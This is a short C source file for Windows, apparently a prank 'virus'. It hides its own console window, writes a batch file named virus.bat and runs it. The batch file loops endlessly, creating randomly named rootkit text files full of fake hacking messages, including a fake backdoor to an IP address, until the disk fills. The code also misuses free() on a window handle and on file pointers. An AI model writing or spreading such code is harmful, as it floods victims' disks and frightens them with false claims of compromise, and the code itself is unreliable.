#include <stdio.h>
#include <windows.h>
#define PATH "virus.bat"

int main(int argc, char* argv[])
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    free(window);

    FILE *a = fopen("virus.bat", "ab+");
    fclose(a);
    free(a);

    FILE *fp;

    fp = fopen(PATH, "w");
    fprintf(fp, "echo off\n:start\necho ==   YOU ARE HACKED   ==;INJECTC \%%random\%%/SYS/ROOT . . . DONE;MOVEC \%%random\%%/SYS/ROOT->SYS/WIN32 . . . DONE;BACKD \%%random\%%/SYS/ROOT->36.162.91.30 . . . DONE;ENCRYPTD \%%random\%%/SYS/ROOT . . . DONE;STORED \%%random\%%/SYS/ROOT . . . DONE;. . . COMPLETED INJECTION OF ROOTKIT>rootkit\%%random\%%.txt\ngoto start");

    fclose(fp);
    free(fp);

    system(PATH);
    Sleep(10);
    remove(PATH);
    return 0;
}
